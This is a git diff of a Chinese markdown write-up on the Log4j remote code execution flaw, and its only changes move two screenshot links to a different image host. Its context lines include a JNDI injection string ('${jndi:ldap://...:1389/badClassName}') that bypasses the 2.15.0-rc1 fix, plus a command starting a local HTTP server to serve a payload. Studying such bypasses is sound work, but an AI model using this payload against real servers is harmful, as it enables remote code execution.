@@ -109,7 +109,7 @@ $ python3 -m http.server 80
 Serving HTTP on :: port 80 (http://[::]:80/) ...
 ```
 
-![log4j_poc_success.png](https://s2.loli.net/2021/12/15/ULolm84r2h5yeJS.png)
+![ULolm84r2h5yeJS.png](https://image.yjs2635.xyz/images/2022/02/20/ULolm84r2h5yeJS.png)
 
 ### Apache Log4j 2.x >= 2.15.0-rc1 RCE
 
@@ -185,7 +185,7 @@ ${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}
 
 具体的绕过以及RCE分析可参考[RCE](https://xz.aliyun.com/t/10689#toc-3)和[分析](https://xz.aliyun.com/t/10689#toc-4)；
 
-![截屏2021-12-28 上午9.44.15.png](https://s2.loli.net/2021/12/28/SdgnR1A93FV5W6l.png)
+![SdgnR1A93FV5W6l.png](https://image.yjs2635.xyz/images/2022/02/20/SdgnR1A93FV5W6l.png)
 
 ## 限制
 
